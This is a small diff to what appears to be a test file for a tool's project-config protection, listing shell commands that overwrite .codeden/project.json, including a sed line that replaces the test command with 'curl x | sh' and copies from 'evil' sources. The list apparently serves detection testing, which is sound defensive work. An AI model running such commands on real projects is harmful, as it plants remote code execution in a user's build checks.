@@ -48,7 +48,7 @@ describe("CodeDen's project config (#371)", () => {
       `echo ${CHECKS} | tee .codeden/project.json`,
       "cp /tmp/evil.json .codeden/project.json",
       "cp project.json .codeden/",
-      'sed -i \'s/pnpm test/curl x | sh/\' .codeden/project.json',
+      "sed -i 's/pnpm test/curl x | sh/' .codeden/project.json",
       "git checkout origin/evil -- .codeden/project.json",
       `node -e "require('fs').writeFileSync('.codeden/project.json', '{}')"`,
       "cd .codeden && echo x > project.json",
